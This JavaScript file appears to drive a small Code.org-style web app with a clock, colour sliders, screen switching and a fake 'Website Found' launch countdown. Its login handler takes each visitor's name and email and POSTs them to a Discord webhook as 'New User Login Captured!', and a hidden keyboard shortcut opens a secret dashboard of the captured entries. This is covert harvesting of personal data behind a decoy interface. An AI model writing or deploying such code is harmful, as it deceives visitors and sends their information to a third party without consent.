// Global memory variables
var userLogs = [];
var currentScreen = "loginScreen";

// ---------------------------------------------------------
// CLOCK ENGINE
// ---------------------------------------------------------
function updateClock() {
    var d = new Date();
    var hours = d.getHours();
    var minutes = d.getMinutes();
    var seconds = d.getSeconds();
    var ampm = hours >= 12 ? " PM" : " AM";
    
    hours = hours % 12;
    hours = hours ? hours : 12;
    
    if (minutes < 10) minutes = "0" + minutes;
    if (seconds < 10) seconds = "0" + seconds;
    
    var timeLabel = document.getElementById("timeLabel");
    if(timeLabel) {
        timeLabel.innerText = hours + ":" + minutes + ":" + seconds + ampm;
    }
}
updateClock();
setInterval(updateClock, 1000);

// Helper function to handle screen switching seamlessly
function setScreen(newScreenId) {
    document.getElementById(currentScreen).classList.add("hidden");
    document.getElementById(newScreenId).classList.remove("hidden");
    currentScreen = newScreenId;
}

// ---------------------------------------------------------
// BACKGROUND SLIDER SYSTEM
// ---------------------------------------------------------
setInterval(function() {
    var r = document.getElementById("sliderR").value;
    var g = document.getElementById("sliderG").value;
    var b = document.getElementById("sliderB").value;
    document.body.style.backgroundColor = "rgb(" + r + "," + g + "," + b + ")";
}, 20);

// ---------------------------------------------------------
// SCREEN NAVIGATION HANDLERS
// ---------------------------------------------------------
document.getElementById("settingsBtn").addEventListener("click", function() {
    setScreen("screen2");
});

document.getElementById("home").addEventListener("click", function() {
    setScreen("loginScreen");
});

document.getElementById("home2").addEventListener("click", function() {
    setScreen("screen1");
});

document.getElementById("flappy").addEventListener("click", function() {
    window.open("https://code.org", "_blank");
});

// ---------------------------------------------------------
// START APP BUTTON TIMER ANIMATION
// ---------------------------------------------------------
document.getElementById("Start").addEventListener("click", function() {
    var startBtn = document.getElementById("Start");
    var label1 = document.getElementById("label1");
    
    label1.innerText = "Initializing...";
    startBtn.innerText = "Starting in 5s";
    
    setTimeout(function() { startBtn.innerText = "4s"; }, 1000);
    setTimeout(function() { startBtn.innerText = "3s"; }, 2000);
    setTimeout(function() { 
        label1.innerText = "Website Found"; 
        startBtn.innerText = "2s"; 
    }, 3000);
    setTimeout(function() { 
        label1.innerText = "Make Sure to Allow Popups & Redirects"; 
        startBtn.innerText = "1s"; 
    }, 4000);
    setTimeout(function() { startBtn.innerText = "0s"; }, 5000);
    setTimeout(function() {
        document.body.style.backgroundColor = "rgb(0,0,0)";
        window.open("https://code.org", "_blank");
    }, 6000);
});

// ---------------------------------------------------------
// VALIDATION AND DATA ENTRY SUBMISSION (ENTER BUTTON)
// ---------------------------------------------------------
document.getElementById("Exitlogin").addEventListener("click", function() {
    // Reset warning highlights
    document.getElementById("label10").classList.add("hidden");
    document.getElementById("label11").classList.add("hidden");
    document.getElementById("label9").classList.add("hidden");

    var nameVal = document.getElementById("nameInput").value;
    var emailVal = document.getElementById("emailInput").value;
    var isChecked = document.getElementById("checkbox3").checked;

    if (isChecked && nameVal !== "" && emailVal !== "" && emailVal.includes("@")) {
        var timestamp = new Date().toLocaleTimeString();
        var logEntry = "[" + timestamp + "] Name: " + nameVal + " | Email: " + emailVal;
        userLogs.push(logEntry);

        // --- DISCORD WEBHOOK FOR STANDARD WEBSITES ---
        var trackingWebhookUrl = "https://discord.com";
        
        var messageText = "📥 **New User Login Captured!**\n👤 **Name:** " + nameVal + "\n📧 **Email:** " + emailVal + "\n⏰ **Time:** " + timestamp;

        // Clean standard JSON structure (Works instantly outside of Code.org!)
        fetch(trackingWebhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: messageText })
        })
        .then(function() { console.log("Webhook success!"); })
        .catch(function(err) { console.error("Error sending log: ", err); });
        // ---------------------------------------------------

        setScreen("screen1");
    } else {
        if (nameVal === "") document.getElementById("label10").classList.remove("hidden");
        if (emailVal === "" || !emailVal.includes("@")) document.getElementById("label11").classList.remove("hidden");
        if (!isChecked) document.getElementById("label9").classList.remove("hidden");
    }
});

// ---------------------------------------------------------
// KEYBOARD SHORTCUT DEVELOPER DETECTOR
// ---------------------------------------------------------
window.addEventListener("keydown", function(event) {
    if (currentScreen === "screen1" && (event.key === "d" || event.key === "D")) {
        console.log("Secret dashboard overlay view opened.");
        var displayText = userLogs.join("\n");
        if (userLogs.length === 0) {
            displayText = "No user logs captured yet in this local view.";
        }
        document.getElementById("devLogText").value = displayText;
        setScreen("devScreen");
    }
});

document.getElementById("devBack").addEventListener("click", function() {
    setScreen("screen1");
});
